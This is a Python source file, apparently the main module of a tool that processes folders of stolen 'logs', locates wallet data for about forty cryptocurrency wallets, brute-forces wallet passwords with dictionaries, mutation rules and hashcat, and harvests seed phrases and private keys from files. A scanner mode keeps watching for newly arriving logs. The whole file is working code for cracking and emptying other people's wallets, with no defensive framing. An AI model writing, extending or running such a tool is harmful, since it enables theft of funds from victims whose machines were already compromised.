import os
import pickle
import time
import multiprocessing

import config
import utils
import searcher as searcher
from itertools import repeat

from wallets import wallet
from wallets import decrypt


class MainApplicationCLI:
    def __init__(self):
        self.path_metamask = set()
        self.path_bnb_chain = set()
        self.path_ronin = set()
        self.path_tronlink = set()
        self.path_sui = set()
        self.path_brave = set()
        self.path_brave_extension = set()
        self.path_kardia_chain = set()
        self.path_keplr = set()
        self.path_petra = set()
        self.path_martian = set()
        self.path_trust = set()
        self.path_phantom = set()
        self.path_atomic = set()
        self.path_coin98 = set()
        self.path_okx = set()
        self.path_math = set()
        self.path_unisat = set()
        self.path_exodus_extension = set()
        self.path_coinbase = set()
        self.path_braavos = set()
        self.path_rabby = set()
        self.path_terra = set()
        self.path_safepal = set()
        self.path_cryptocom = set()
        self.path_clover = set()
        self.path_energy8 = set()
        self.path_pontem_aptos = set()
        self.path_spika = set()
        self.path_finx = set()
        self.path_token_pocket = set()
        self.path_nifty = set()
        self.path_zeon = set()
        self.path_pantograph = set()
        self.path_starmask = set()
        self.path_monsta = set()
        self.path_btc = set()
        self.path_ltc = set()
        self.path_doge = set()
        self.path_dash = set()
        self.path_guarda = set()
        self.path_exodus_desktop = set()
        self.path_electrum = set()
        self.path_coinomi = set()
        self.path_daedalus = set()
        self.path_mymonero = set()
        self.path_myetherwallet = set()
        self.path_files = set()

        self.path_all = [
            self.path_metamask,
            self.path_bnb_chain,
            self.path_ronin,
            self.path_tronlink,
            self.path_sui,
            self.path_brave,
            self.path_brave_extension,
            self.path_kardia_chain,
            self.path_keplr,
            self.path_petra,
            self.path_martian,
            self.path_trust,
            self.path_phantom,
            self.path_atomic,
            self.path_coin98,
            self.path_okx,
            self.path_math,
            self.path_unisat,
            self.path_exodus_extension,
            self.path_coinbase,
            self.path_braavos,
            self.path_rabby,
            self.path_terra,
            self.path_safepal,
            self.path_cryptocom,
            self.path_clover,
            self.path_energy8,
            self.path_pontem_aptos,
            self.path_spika,
            self.path_token_pocket,
            self.path_nifty,
            self.path_zeon,
            self.path_pantograph,
            self.path_starmask,
            self.path_monsta,
            self.path_btc,
            self.path_ltc,
            self.path_doge,
            self.path_dash,
            self.path_guarda,
            self.path_exodus_desktop,
            self.path_electrum,
            self.path_coinomi,
            self.path_daedalus,
            self.path_mymonero,
            self.path_myetherwallet,
            self.path_files,
        ]

        self.parsed_seeds = 0
        self.parsed_privkeys = 0
        self.wallets_cracked = 0

        # results path
        if not os.path.exists("results"):
            os.makedirs("results")

        self.path_results_mnemonics = "results/seeds"
        if not os.path.exists(self.path_results_mnemonics):
            os.makedirs(self.path_results_mnemonics)

        self.path_results_privkeys = "results/privkeys"
        if not os.path.exists(self.path_results_privkeys):
            os.makedirs(self.path_results_privkeys)

        self.path_results_failed = "results/failed"
        if not os.path.exists(self.path_results_failed):
            os.makedirs(self.path_results_failed)

        self.path_results_cracked = "results/cracked"
        if not os.path.exists(self.path_results_cracked):
            os.makedirs(self.path_results_cracked)

        if config.enable_rules:
            self.path_failed_logs = "failed_logs"
            if not os.path.exists(self.path_failed_logs):
                os.makedirs(self.path_failed_logs)

        # load db
        try:
            with open("resources/checked_logs.db", "rb") as p:
                self.seen_db = pickle.load(p)
        except:
            self.seen_db = set()

    def work(self):
        cores = utils.get_cores()
        start_time = time.time()

        path_hashcat = config.path_binary.split("/")[:-1]
        path_hashcat = "/".join(path_hashcat)

        passwords_dictionary = set()
        if config.path_dictionary:
            try:
                with open(config.path_dictionary, "r", encoding="utf8", errors="ignore") as f:
                    for line in f:
                        try:
                            password = line.strip()
                            passwords_dictionary.add(password)
                        except:
                            pass
            except:
                pass

        utils.write_logs(f"LOADED DICTIONARY PASSWORDS: {len(passwords_dictionary)}")

        def wallets_clear():
            for path in self.path_all:
                path.clear()

        def wallets_parse(path_log):
            for root, dirs, files in os.walk(path_log):
                for filename in files:
                    path_wallet: str = os.path.join(root, filename)
                    path_wallet: str = path_wallet.replace("\\", "/")
                    path_wallet_low: str = path_wallet.lower()

                    if (config.parse_seeds or config.parse_privkeys) and path_wallet_low.endswith((".txt", ".json", ".html", ".doc", ".docx")):
                        self.path_files.add(path_wallet)

                    elif path_wallet_low.endswith((".log", ".ldb")):
                        path_wallet_folder = utils.get_path_wallet_folder(path_wallet)

                        # web
                        if config.check_metamask and utils.is_wallet(path_wallet, "metamask"):
                            self.path_metamask.add(path_wallet_folder)
                        if config.check_ronin and utils.is_wallet(path_wallet, "ronin"):
                            self.path_ronin.add(path_wallet_folder)
                        if config.check_tronlink and utils.is_wallet(path_wallet, "tron"):
                            self.path_tronlink.add(path_wallet_folder)
                        if config.check_brave_extension and utils.is_wallet(path_wallet, "brave"):
                            self.path_brave_extension.add(path_wallet_folder)
                        if config.check_bnb_chain and utils.is_wallet(path_wallet, "binance"):
                            self.path_bnb_chain.add(path_wallet_folder)
                        if config.check_kardia_chain and utils.is_wallet(path_wallet, "kardia"):
                            self.path_kardia_chain.add(path_wallet_folder)
                        if config.check_clover and (utils.is_wallet(path_wallet, "clover") or utils.is_wallet(path_wallet, "clv")):
                            self.path_clover.add(path_wallet_folder)
                        if config.check_sui and utils.is_wallet(path_wallet, "sui"):
                            self.path_sui.add(path_wallet_folder)
                        if config.check_atomic and utils.is_wallet(path_wallet, "atomic"):
                            self.path_atomic.add(path_wallet_folder)
                        if config.check_phantom and utils.is_wallet(path_wallet, "phantom"):
                            self.path_phantom.add(path_wallet_folder)
                        if config.check_keplr and utils.is_wallet(path_wallet, "keplr"):
                            self.path_keplr.add(path_wallet_folder)
                        if config.check_petra and utils.is_wallet(path_wallet, "petra"):
                            self.path_petra.add(path_wallet_folder)
                        if config.check_trust and utils.is_wallet(path_wallet, "trust"):
                            self.path_trust.add(path_wallet_folder)
                        if config.check_exodus_extension and (utils.is_wallet(path_wallet, "exodus") and utils.is_wallet(path_wallet, "web")):
                            self.path_exodus_extension.add(path_wallet_folder)
                        if config.check_martian and utils.is_wallet(path_wallet, "martian"):
                            self.path_martian.add(path_wallet_folder)
                        if config.check_guarda and utils.is_wallet(path_wallet, "guarda"):
                            self.path_guarda.add(path_wallet_folder)
                        if config.check_coin98 and utils.is_wallet(path_wallet, "coin98"):
                            self.path_coin98.add(path_wallet_folder)
                        if config.check_okx and utils.is_wallet(path_wallet, "okx"):
                            self.path_okx.add(path_wallet_folder)
                        if config.check_math and utils.is_wallet(path_wallet, "math"):
                            self.path_math.add(path_wallet_folder)
                        if config.check_unisat and utils.is_wallet(path_wallet, "unisat"):
                            self.path_unisat.add(path_wallet_folder)
                        if config.check_coinbase and utils.is_wallet(path_wallet, "coinbase"):
                            self.path_coinbase.add(path_wallet_folder)
                        if config.check_braavos and utils.is_wallet(path_wallet, "braavos"):
                            self.path_braavos.add(path_wallet_folder)
                        if config.check_rabby and utils.is_wallet(path_wallet, "rabby"):
                            self.path_rabby.add(path_wallet_folder)
                        if config.check_terra and (utils.is_wallet(path_wallet, "terra") or utils.is_wallet(path_wallet, "station")):
                            self.path_terra.add(path_wallet_folder)
                        if config.check_cryptocom and (utils.is_wallet(path_wallet, "crypto.com") or utils.is_wallet(path_wallet, "cryptocom") or utils.is_wallet(path_wallet, "crypto com")):
                            self.path_cryptocom.add(path_wallet_folder)

                        # metamask like
                        if config.check_energy8 and utils.is_wallet(path_wallet, "energy8"):
                            self.path_energy8.add(path_wallet_folder)
                        if config.check_pontem_aptos and utils.is_wallet(path_wallet, "pontem"):
                            self.path_pontem_aptos.add(path_wallet_folder)
                        if config.check_spika and utils.is_wallet(path_wallet, "spika"):
                            self.path_spika.add(path_wallet_folder)
                        if config.check_finx and utils.is_wallet(path_wallet, "finx"):
                            self.path_finx.add(path_wallet_folder)
                        if config.check_token_pocket and (utils.is_wallet(path_wallet, "token_pocket") or utils.is_wallet(path_wallet, "token pocket")):
                            self.path_token_pocket.add(path_wallet_folder)
                        if config.check_zeon and utils.is_wallet(path_wallet, "zeon"):
                            self.path_zeon.add(path_wallet_folder)
                        if config.check_pantograph and utils.is_wallet(path_wallet, "pantograph"):
                            self.path_pantograph.add(path_wallet_folder)
                        if config.check_starmask and utils.is_wallet(path_wallet, "starmask"):
                            self.path_starmask.add(path_wallet_folder)
                        if config.check_monsta and utils.is_wallet(path_wallet, "monsta"):
                            self.path_monsta.add(path_wallet_folder)

                    # electrum
                    elif config.check_electrum and utils.is_wallet(path_wallet, "electrum"):
                        extension_check = path_wallet_low.split("/")[-1]
                        if "." not in extension_check:
                            self.path_electrum.add(path_wallet)

                    # brave
                    elif config.check_braavos and utils.is_wallet(path_wallet, "brave") and path_wallet_low.endswith("preferences"):
                        self.path_brave.add(path_wallet)

                    # coinomi
                    elif config.check_coinomi and utils.is_wallet(path_wallet, "coinomi") and path_wallet.endswith(".wallet"):
                        self.path_coinomi.add(path_wallet)

                    # mymonero
                    elif config.check_mymonero and path_wallet.split("/")[-1].startswith("Wallets__"):
                        self.path_mymonero.add(path_wallet)

                    # daedalus
                    elif config.check_daedalus and path_wallet.endswith(".sqlite") and (path_wallet.split("/")[-1].startswith("she.") or path_wallet.split("/")[-1].startswith("md.")):
                        self.path_daedalus.add(path_wallet)

                    # exodus desktop
                    elif config.check_exodus_desktop and path_wallet_low.endswith("seed.seco"):
                        path_wallet_folder = utils.get_path_wallet_folder(path_wallet)
                        self.path_exodus_desktop.add(path_wallet_folder)

                    # core wallets
                    elif path_wallet_low.endswith(".dat"):
                        if config.check_btc and (utils.is_wallet(path_wallet, "btc") or utils.is_wallet(path_wallet, "bitcoin")):
                            self.path_btc.add(path_wallet)
                        elif config.check_ltc and (utils.is_wallet(path_wallet, "ltc") or utils.is_wallet(path_wallet, "litecoin")):
                            self.path_ltc.add(path_wallet)
                        elif config.check_doge and utils.is_wallet(path_wallet, "doge"):
                            self.path_doge.add(path_wallet)
                        elif config.check_dash and utils.is_wallet(path_wallet, "dash"):
                            self.path_dash.add(path_wallet)

                    # myetherwallet
                    elif config.check_myetherwallet and filename.lower()[0:5] == "utc--":
                        self.path_myetherwallet.add(path_wallet)

        def save_cracked(wallet_name, path_wallet, correct_password, addresses, mnemonics):
            try:
                utils.save_cracked(self.path_results_cracked, wallet_name, path_wallet, correct_password, addresses, mnemonics)
                utils.save_mnemonics(self.path_results_mnemonics, wallet_name, mnemonics)

                output = "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n"
                output += f"+ Path->>>>>>>>>>>>>>| {path_wallet}\n"
                output += f"+ Status->>>>>>>>>>>>| {utils.c.GREEN}CRACKED{utils.c.END}\n"
                output += f"+ Password->>>>>>>>>>| {correct_password}\n"
                for a in addresses:
                    if len(a) > 3:
                        output += f"+ Address->>>>>>>>>>| {a}\n"
                for m in mnemonics:
                    output += f"+ Mnemonic->>>>>>>>>>| {m}\n"
                print(output)
            except:
                pass

        def save_failed(path_log, path_wallet, wallet_name, wallet_hash, addresses, passwords):
            try:
                if config.copy_failed_logs:
                    utils.copy_folder(path_log)

                utils.save_failed(self.path_results_failed, wallet_name, path_wallet, wallet_hash, addresses, passwords)

                output = "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n"
                output += f"+ Path->>>>>>>>>>| {path_wallet}\n"
                output += f"+ Status->>>>>>>>>>| {utils.c.RED}FAILED{utils.c.END}\n"
                for a in addresses:
                    if len(a) > 3:
                        output += f"+ Address->>>>>>>>>>| {a}\n"
                print(output)
            except:
                pass

        def wallets_crack():
            wallet_names = [
                "metamask",
                "bnb_chain",
                "ronin",
                "tronlink",
                "sui",
                "brave",
                "brave_extension",
                "kardia_chain",
                "keplr",
                "petra",
                "martian",
                "trust",
                "phantom",
                "atomic",
                "coin98",
                "okx",
                "math",
                "unisat",
                "exodus_extension",
                "coinbase",
                "braavos",
                "rabby",
                "terra",
                "safepal",
                "cryptocom",
                "cryptocom_extension",
                "clover",
                "metamask_like",
                "bitcoin",
                "litecoin",
                "doge",
                "dash",
                "guarda",
                "exodus_desktop",
                "electrum",
                "coinomi",
                "daedalus",
                "mymonero",
                "myetherwallet",
            ]

            for wallet_name in wallet_names:
                if wallet_name == "metamask" and config.check_metamask:
                    wallet_paths = self.path_metamask
                    wallet_type = wallet.WalletType.METAMASK
                    wallet_params = None
                elif wallet_name == "trust" and config.check_trust:
                    wallet_paths = self.path_trust
                    wallet_type = wallet.WalletType.TRUST
                    wallet_params = None
                elif wallet_name == "tronlink" and config.check_tronlink:
                    wallet_paths = self.path_tronlink
                    wallet_type = wallet.WalletType.TRONLINK
                    wallet_params = None
                elif wallet_name == "atomic" and config.check_atomic:
                    wallet_paths = self.path_atomic
                    wallet_type = wallet.WalletType.ATOMIC
                    wallet_params = None
                elif wallet_name == "guarda" and config.check_guarda:
                    wallet_paths = self.path_guarda
                    wallet_type = wallet.WalletType.GUARDA
                    wallet_params = None
                elif wallet_name == "brave" and config.check_brave:
                    wallet_paths = self.path_brave
                    wallet_type = wallet.WalletType.BRAVE
                    wallet_params = None
                elif wallet_name == "keplr" and config.check_keplr:
                    wallet_paths = self.path_keplr
                    wallet_type = wallet.WalletType.KEPLR
                    wallet_params = None
                elif wallet_name == "phantom" and config.check_phantom:
                    wallet_paths = self.path_phantom
                    wallet_type = wallet.WalletType.PHANTOM
                    wallet_params = None
                elif wallet_name == "ronin" and config.check_ronin:
                    wallet_paths = self.path_ronin
                    wallet_type = wallet.WalletType.RONIN
                    wallet_params = None
                elif wallet_name == "unisat" and config.check_unisat:
                    wallet_paths = self.path_unisat
                    wallet_type = wallet.WalletType.UNISAT
                    wallet_params = None
                elif wallet_name == "brave_extension" and config.check_brave_extension:
                    wallet_paths = self.path_brave_extension
                    wallet_type = wallet.WalletType.BRAVE_EXTENSION
                    wallet_params = None
                elif wallet_name == "bnb_chain" and config.check_bnb_chain:
                    wallet_paths = self.path_bnb_chain
                    wallet_type = wallet.WalletType.BNB_CHAIN
                    wallet_params = None
                elif wallet_name == "clover" and config.check_clover:
                    wallet_paths = self.path_clover
                    wallet_type = wallet.WalletType.CLOVER
                    wallet_params = None
                elif wallet_name == "kardia_chain" and config.check_kardia_chain:
                    wallet_paths = self.path_kardia_chain
                    wallet_type = wallet.WalletType.KARDIA_CHAIN
                    wallet_params = None
                elif wallet_name == "sui" and config.check_sui:
                    wallet_paths = self.path_sui
                    wallet_type = wallet.WalletType.SUI
                    wallet_params = None
                elif wallet_name == "coinbase" and config.check_coinbase:
                    wallet_paths = self.path_coinbase
                    wallet_type = wallet.WalletType.COINBASE
                    wallet_params = None
                elif wallet_name == "braavos" and config.check_braavos:
                    wallet_paths = self.path_braavos
                    wallet_type = wallet.WalletType.BRAAVOS
                    wallet_params = None
                elif wallet_name == "rabby" and config.check_rabby:
                    wallet_paths = self.path_rabby
                    wallet_type = wallet.WalletType.RABBY
                    wallet_params = None
                elif wallet_name == "terra" and config.check_terra:
                    wallet_paths = self.path_terra
                    wallet_type = wallet.WalletType.TERRA
                    wallet_params = None
                elif wallet_name == "exodus_extension" and config.check_exodus_extension:
                    wallet_paths = self.path_exodus_extension
                    wallet_type = wallet.WalletType.EXODUS_EXTENSION
                    wallet_params = None
                elif wallet_name == "exodus_desktop" and config.check_exodus_desktop:
                    wallet_paths = self.path_exodus_desktop
                    wallet_type = wallet.WalletType.EXODUS_DESKTOP
                    wallet_params = None
                elif wallet_name == "cryptocom_extension" and config.check_cryptocom:
                    wallet_paths = self.path_cryptocom
                    wallet_type = wallet.WalletType.CRYPTOCOM_EXTENSION
                    wallet_params = None
                elif wallet_name == "cryptocom" and config.check_cryptocom:
                    wallet_paths = self.path_cryptocom
                    wallet_type = wallet.WalletType.CRYPTOCOM
                    wallet_params = None
                elif wallet_name == "safepal" and config.check_safepal:
                    wallet_paths = self.path_safepal
                    wallet_type = wallet.WalletType.SAFEPAL
                    wallet_params = None
                elif wallet_name == "okx" and config.check_okx:
                    wallet_paths = self.path_okx
                    wallet_type = wallet.WalletType.OKX
                    wallet_params = None
                elif wallet_name == "coinomi" and config.check_coinomi:
                    wallet_paths = self.path_coinomi
                    wallet_type = wallet.WalletType.COINOMI
                    wallet_params = None
                elif wallet_name == "coin98" and config.check_coin98:
                    wallet_paths = self.path_coin98
                    wallet_type = wallet.WalletType.COIN98
                    wallet_params = None
                elif wallet_name == "martian" and config.check_martian:
                    wallet_paths = self.path_martian
                    wallet_type = wallet.WalletType.MARTIAN
                    wallet_params = None
                elif wallet_name == "math" and config.check_math:
                    wallet_paths = self.path_math
                    wallet_type = wallet.WalletType.MATH
                    wallet_params = None
                elif wallet_name == "petra" and config.check_petra:
                    wallet_paths = self.path_petra
                    wallet_type = wallet.WalletType.PETRA
                    wallet_params = None
                elif wallet_name == "mymonero" and config.check_mymonero:
                    wallet_paths = self.path_mymonero
                    wallet_type = wallet.WalletType.MYMONERO
                    wallet_params = None
                elif wallet_name == "daedalus" and config.check_daedalus:
                    wallet_paths = self.path_daedalus
                    wallet_type = wallet.WalletType.DAEDALUS
                    wallet_params = None
                elif wallet_name == "myetherwallet" and config.check_myetherwallet:
                    wallet_paths = self.path_myetherwallet
                    wallet_type = wallet.WalletType.MYETHERWALLET
                    wallet_params = None
                elif wallet_name == "electrum" and config.check_electrum:
                    wallet_paths = self.path_electrum
                    wallet_type = wallet.WalletType.ELECTRUM
                    wallet_params = None
                elif wallet_name == "bitcoin" and config.check_btc:
                    wallet_paths = self.path_btc
                    wallet_type = wallet.WalletType.CORE
                    wallet_params = {"network_name": "bitcoin"}
                elif wallet_name == "litecoin" and config.check_ltc:
                    wallet_paths = self.path_ltc
                    wallet_type = wallet.WalletType.CORE
                    wallet_params = {"network_name": "litecoin"}
                elif wallet_name == "doge" and config.check_doge:
                    wallet_paths = self.path_doge
                    wallet_type = wallet.WalletType.CORE
                    wallet_params = {"network_name": "doge"}
                elif wallet_name == "dash" and config.check_dash:
                    wallet_paths = self.path_dash
                    wallet_type = wallet.WalletType.CORE
                    wallet_params = {"network_name": "dash"}
                elif wallet_name == "metamask_like" and config.check_energy8:
                    wallet_paths = self.path_energy8
                    wallet_type = wallet.WalletType.METAMASK_LIKE
                    wallet_params = {"wallet_type": "energy8"}
                elif wallet_name == "metamask_like" and config.check_pontem_aptos:
                    wallet_paths = self.path_pontem_aptos
                    wallet_type = wallet.WalletType.METAMASK_LIKE
                    wallet_params = {"wallet_type": "pontem_aptos"}
                elif wallet_name == "metamask_like" and config.check_spika:
                    wallet_paths = self.path_spika
                    wallet_type = wallet.WalletType.METAMASK_LIKE
                    wallet_params = {"wallet_type": "spika"}
                elif wallet_name == "metamask_like" and config.check_token_pocket:
                    wallet_paths = self.path_token_pocket
                    wallet_type = wallet.WalletType.METAMASK_LIKE
                    wallet_params = {"wallet_type": "token_pocket"}
                elif wallet_name == "metamask_like" and config.check_zeon:
                    wallet_paths = self.path_zeon
                    wallet_type = wallet.WalletType.METAMASK_LIKE
                    wallet_params = {"wallet_type": "zeon"}
                elif wallet_name == "metamask_like" and config.check_pantograph:
                    wallet_paths = self.path_pantograph
                    wallet_type = wallet.WalletType.METAMASK_LIKE
                    wallet_params = {"wallet_type": "pantograph"}
                elif wallet_name == "metamask_like" and config.check_starmask:
                    wallet_paths = self.path_starmask
                    wallet_type = wallet.WalletType.METAMASK_LIKE
                    wallet_params = {"wallet_type": "starmask"}
                elif wallet_name == "metamask_like" and config.check_monsta:
                    wallet_paths = self.path_monsta
                    wallet_type = wallet.WalletType.METAMASK_LIKE
                    wallet_params = {"wallet_type": "monsta"}
                elif wallet_name == "metamask_like" and config.check_finx:
                    wallet_paths = self.path_finx
                    wallet_type = wallet.WalletType.METAMASK_LIKE
                    wallet_params = {"wallet_type": "finx"}
                else:
                    continue

                utils.set_title(f"Bruting {wallet_name.title()} wallets...")

                with multiprocessing.Pool(cores) as p:
                    for result in p.imap_unordered(
                        decrypt.proc_wallet,
                        zip(
                            wallet_paths,
                            repeat(wallet_type),
                            repeat(wallet_params),
                            repeat(config.path_antipublic),
                            repeat(passwords_dictionary),
                            repeat(config.toggle_case),
                            repeat(config.add_specials),
                            repeat(config.add_numbers),
                            repeat(config.timeout),
                        ),
                    ):
                        if result:
                            path_wallet = result["path"]
                            wallet_hash = result["wallet_hash"]
                            correct_password = result["correct_password"]
                            addresses = result["addresses"]
                            mnemonics = result["mnemonics"]
                            passwords = result["passwords"]

                            if correct_password:
                                save_cracked(wallet_name, path_wallet, correct_password, addresses, mnemonics)
                            else:
                                path_log = utils.get_path_log(path_wallet)
                                is_cracked = False

                                if config.enable_rules and wallet_hash:
                                    hash_mode = utils.get_hash_mode(wallet_name, wallet_hash)
                                    if not hash_mode:
                                        continue

                                    proc_data = [path_wallet, wallet_type, wallet_params, False, passwords_dictionary, False, False, False, 1]
                                    decrypted_data = utils.try_hashcat(path_hashcat, config.path_binary, hash_mode, wallet_hash, path_log, proc_data)
                                    if decrypted_data:
                                        correct_password = decrypted_data["correct_password"]
                                        addresses = decrypted_data["addresses"]
                                        mnemonics = decrypted_data["mnemonics"]
                                        save_cracked(wallet_name, path_wallet, correct_password, addresses, mnemonics)
                                        is_cracked = True

                                    if not is_cracked:
                                        save_failed(path_log, path_wallet, wallet_name, wallet_hash, addresses, passwords)

            # parse seeds
            if config.parse_seeds:
                utils.set_title(f"Seed parsing...")
                with multiprocessing.Pool(cores) as p:
                    for result in p.imap_unordered(searcher.parse, zip(self.path_files, repeat("seeds"))):
                        if result:
                            path_file = result["path"]
                            mnemonics = result["mnemonics"]
                            mnemonics_found = len(mnemonics)
                            if mnemonics_found > 0:
                                utils.save_mnemonics(self.path_results_mnemonics, "parsed", mnemonics)
                                output = "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n"
                                output += f"+ Path->>>>>>>>>>>>>>| {path_file}\n"
                                output += f"+ Status->>>>>>>>>>>>| {utils.c.GREEN}PARSED{utils.c.END}\n"
                                for m in mnemonics:
                                    output += f"+ Mnemonic...........| {m}\n"
                                print(output)

            # parse privkeys
            if config.parse_privkeys:
                utils.set_title(f"Pkeys parsing...")
                with multiprocessing.Pool(cores) as p:
                    for result in p.imap_unordered(searcher.parse, zip(self.path_files, repeat("privkeys"))):
                        if result:
                            path_file = result["path"]
                            privkeys_eth = result["privkeys_eth"]
                            privkeys_btc = result["privkeys_btc"]
                            privkeys_ltc = result["privkeys_ltc"]
                            privkeys_doge = result["privkeys_doge"]
                            privkeys_dash = result["privkeys_dash"]

                            # eth
                            privkeys_found = len(privkeys_eth)
                            if privkeys_found > 0:
                                utils.save_mnemonics(self.path_results_privkeys, "eth", privkeys_eth)
                                output = "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n"
                                output += f"+ Path->>>>>>>>>>>>>>| {path_file}\n"
                                output += f"+ Status->>>>>>>>>>>>| {utils.c.GREEN}PARSED{utils.c.END}\n"
                                for p in privkeys_eth:
                                    output += f"+ Private Key->>>>>>>>>>| {p}\n"
                                print(output)

                            # btc
                            privkeys_found = len(privkeys_btc)
                            if privkeys_found > 0:
                                utils.save_mnemonics(self.path_results_privkeys, "btc", privkeys_btc)
                                output = "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n"
                                output += f"+ Path->>>>>>>>>>>>>>| {path_file}\n"
                                output += f"+ Status->>>>>>>>>>>>| {utils.c.GREEN}PARSED{utils.c.END}\n"
                                for p in privkeys_btc:
                                    output += f"+ Private Key........| {p}\n"
                                print(output)

                            # ltc
                            privkeys_found = len(privkeys_ltc)
                            if privkeys_found > 0:
                                utils.save_mnemonics(self.path_results_privkeys, "ltc", privkeys_ltc)
                                output = "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n"
                                output += f"+ Path->>>>>>>>>>>>>>| {path_file}\n"
                                output += f"+ Status->>>>>>>>>>>>| {utils.c.GREEN}PARSED{utils.c.END}\n"
                                for p in privkeys_ltc:
                                    output += f"+ Private Key->>>>>>>>>>| {p}\n"
                                print(output)

                            # doge
                            privkeys_found = len(privkeys_doge)
                            if privkeys_found > 0:
                                utils.save_mnemonics(self.path_results_privkeys, "doge", privkeys_doge)
                                output = "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n"
                                output += f"+ Path->>>>>>>>>>>>>>| {path_file}\n"
                                output += f"+ Status->>>>>>>>>>>>| {utils.c.GREEN}PARSED{utils.c.END}\n"
                                for p in privkeys_doge:
                                    output += f"+ Private Key->>>>>>>>>>| {p}\n"
                                print(output)

                            # dash
                            privkeys_found = len(privkeys_dash)
                            if privkeys_found > 0:
                                utils.save_mnemonics(self.path_results_privkeys, "dash", privkeys_dash)
                                output = "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n"
                                output += f"+ Path->>>>>>>>>>>>>>| {path_file}\n"
                                output += f"+ Status->>>>>>>>>>>>| {utils.c.GREEN}PARSED{utils.c.END}\n"
                                for p in privkeys_dash:
                                    output += f"+ Private Key->>>>>>>>>>| {p}\n"
                                print(output)

        def save_checked(path_log, print_output=True):
            utils.write_logs(f"LOG ALLREADY CHECKED - '{path_log}'")
            output = "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n"
            output += f"+ Path->>>>>>>>>>>>>>| {path_log}\n"
            output += f"+ Status->>>>>>>>>>>>| {utils.c.YELLOW}Already Checked{utils.c.END}\n"
            if print_output:
                print(output)

        # scanner mode
        if config.scanner_mode:
            while True:
                for filename in os.listdir(config.path_logs):
                    path_log = os.path.join(config.path_logs, filename)
                    if filename not in self.seen_db:
                        wallets_parse(path_log)
                        self.insert_db(filename)
                    else:
                        save_checked(path_log, False)

                    wallets_found = False
                    for p in self.path_all:
                        if len(p) > 0:
                            wallets_found = True
                            break

                    if wallets_found:
                        wallets_crack()
                        wallets_clear()

                utils.set_title(f"Scanning new logs...")
                time.sleep(1)

        # default mode
        else:
            wallets_clear()

            utils.set_title(f"Wallets searching...")
            for filename in os.listdir(config.path_logs):
                path_log = os.path.join(config.path_logs, filename)

                if config.skip_checked:
                    if filename not in self.seen_db:
                        wallets_parse(path_log)
                        self.insert_db(filename)
                    else:
                        save_checked(path_log)
                else:
                    wallets_parse(path_log)

            wallets_crack()

            end_time = time.time()
            print(f"\n{utils.c.BLUE}Completed in ≈≈≈ {int(end_time-start_time)} seconds{utils.c.END}")



    def insert_db(self, filename):
        self.seen_db.add(filename)
        with open("resources/checked_logs.db", "wb") as p:
            pickle.dump(self.seen_db, p)
